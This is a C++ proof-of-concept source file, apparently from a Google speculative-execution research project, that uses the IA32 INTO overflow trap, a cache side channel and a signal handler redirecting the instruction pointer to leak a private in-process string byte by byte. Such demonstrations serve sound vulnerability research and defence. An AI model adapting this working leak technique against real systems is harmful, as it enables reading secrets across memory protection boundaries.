/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstrates speculation over the overflow trap (#OF) on IA32 CPUs.
 * Since the overflow trap can be invoked only by the INTO instruction and that
 * instruction opcode exists only on IA32, this vulnerability cannot be
 * demonstrated on X64 or AMD64.
 * We cause the overflow trap by taking the secret address that should not be
 * accessed and adding or subtracting from it twice 0x80000000. That cannot
 * change its value because it's always 32-bit number. We pick addition or
 * subtraction by the first bit of the address, so that the second operation
 * creates an overflow. Afterwards we yield the INTO instruction and fetch
 * from the address. Even though the INTO instruction triggers OF (which is
 * ensured by the dead code guard), the next load is speculatively performed.
 **/

#include "compiler_specifics.h"

#if !defined(__linux__) && !defined(__APPLE__)
#  error Unsupported OS. Linux or MacOS required.
#endif

#if !SAFESIDE_IA32
#  error Unsupported architecture. IA32 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(data);
    sidechannel.FlushOracle();

    for (int i = 0; i < 1000; ++i) {
      // Succeeds.
      FetchAfterFalseOFCheck(isolated_oracle.data(), 4096, data, safe_offset);

      // This crashes by the OF trap being raised.
      FetchAfterTrueOFCheck(isolated_oracle.data(), 4096, data, offset);

      std::cout << "Dead code. Must not be printed." << std::endl;

      // The exit call must not be unconditional, otherwise clang would
      // optimize out everything that follows it and the linking would fail.
      if (strlen(public_data) != 0) {
        exit(EXIT_FAILURE);
      }

      // SIGSEGV signal handler moves the instruction pointer to this label.
#ifdef __linux__
      asm volatile("afterspeculation:");
#elif defined(__APPLE__)
      asm volatile("_afterspeculation:");
#else
#  error Unsupported OS.
#endif
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void Sigsegv(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGSEGV signal handler.
  // Moves the instruction pointer to the "afterspeculation" label.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
#ifdef __linux__
  ucontext->uc_mcontext.gregs[REG_EIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#elif defined(__APPLE__)
  ucontext->uc_mcontext->__ss.__eip =
      reinterpret_cast<uintptr_t>(afterspeculation);
#else
#  error Unsupported OS.
#endif
}

static void SetSignal() {
  struct sigaction act;
  act.sa_sigaction = Sigsegv;
  act.sa_flags = SA_SIGINFO;
#ifdef __linux__
  sigaction(SIGSEGV, &act, nullptr);
#elif defined(__APPLE__)
  sigaction(SIGFPE, &act, nullptr);
#else
#  error Unsupported OS.
#endif
}

int main() {
  SetSignal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
